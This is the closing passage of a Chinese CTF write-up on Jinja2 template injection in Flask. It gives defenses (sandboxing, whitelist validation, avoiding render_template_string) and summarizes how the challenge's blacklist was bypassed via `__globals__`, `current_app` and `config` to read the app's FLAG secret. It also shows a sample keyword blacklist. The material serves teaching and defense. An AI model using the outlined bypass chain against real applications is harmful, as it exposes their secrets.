return render_template_string("<h1>Hello, {{ name }}!</h1>", name=user_input)
```

### 11.2 使用沙箱环境

Jinja2 提供了沙箱环境 `jinja2.sandbox.SandboxedEnvironment`，可以限制模板中的危险操作。

### 11.3 使用白名单过滤

```python
# 不推荐：黑名单（总有遗漏）
blacklist = ['config', 'self', '__globals__', ...]

# 推荐：白名单（只允许安全字符）
import re
if not re.match(r'^[a-zA-Z0-9\s]+$', user_input):
    return "Invalid input"
```

### 11.4 避免使用 `render_template_string`

优先使用 `render_template` 渲染独立的模板文件，而不是将用户输入作为模板内容。


## 十二、总结

### 12.1 考点汇总

| 序号 | 考点               | 说明                      |
| :--: | ------------------ | ------------------------- |
|  1   | SSTI 漏洞原理      | Jinja2 模板注入的基本原理 |
|  2   | 括号过滤绕过       | 属性访问不需要括号        |
|  3   | 变量名黑名单绕过   | 属性名不受变量名替换影响  |
|  4   | `__globals__` 属性 | 函数对象访问全局变量      |
|  5   | `current_app` 对象 | Flask 应用实例            |
|  6   | `config` 配置字典  | 存储应用配置信息          |

### 12.2 关键点回顾

1. **SSTI 的核心**：用户输入被直接传入 `render_template_string()`
2. **防护的局限**：黑名单过滤总有遗漏，`url_for` 和 `get_flashed_messages` 未被限制
3. **绕过关键**：Python 的 `__globals__` 属性是突破点
4. **最终目标**：通过属性访问链获取 `app.config['FLAG']`
